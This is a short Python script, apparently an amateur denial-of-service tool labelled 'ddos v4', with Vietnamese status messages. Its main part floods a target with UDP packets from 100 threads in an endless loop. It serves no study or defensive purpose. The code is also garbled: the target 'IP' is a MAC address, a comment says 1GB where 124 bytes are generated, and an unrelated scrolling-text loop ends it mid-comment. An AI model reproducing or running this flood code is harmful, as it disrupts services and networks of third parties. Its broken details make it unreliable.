import os
import socket
import threading
import time 

def attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(124)  # Generate 1GB of random data
    while True:
        sock.sendto(bytes, (target_ip, target_port))

def main():
    target_ip = "68:9e:29:9c:e7:7e"  # Replace with the target IP
    target_port = 24  # Replace with the target port
    for i in range(100):  # Number of threads
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    main()  

message = "hello ddos v4 update Nov 16 06:00!"
print(message)

message = "CODE CHAY THANH CONG!"
print(message)
# tocke

text = "CODE DANG CHAY ... "
width = 2
scroll = " " * width + text

while True:
  for i in range(len(scroll)):
    print(scroll[i:], end="\r", flush=True)
    time.sleep(1.5)  # chỉnh tốc độ ở đây (0.1 giâ
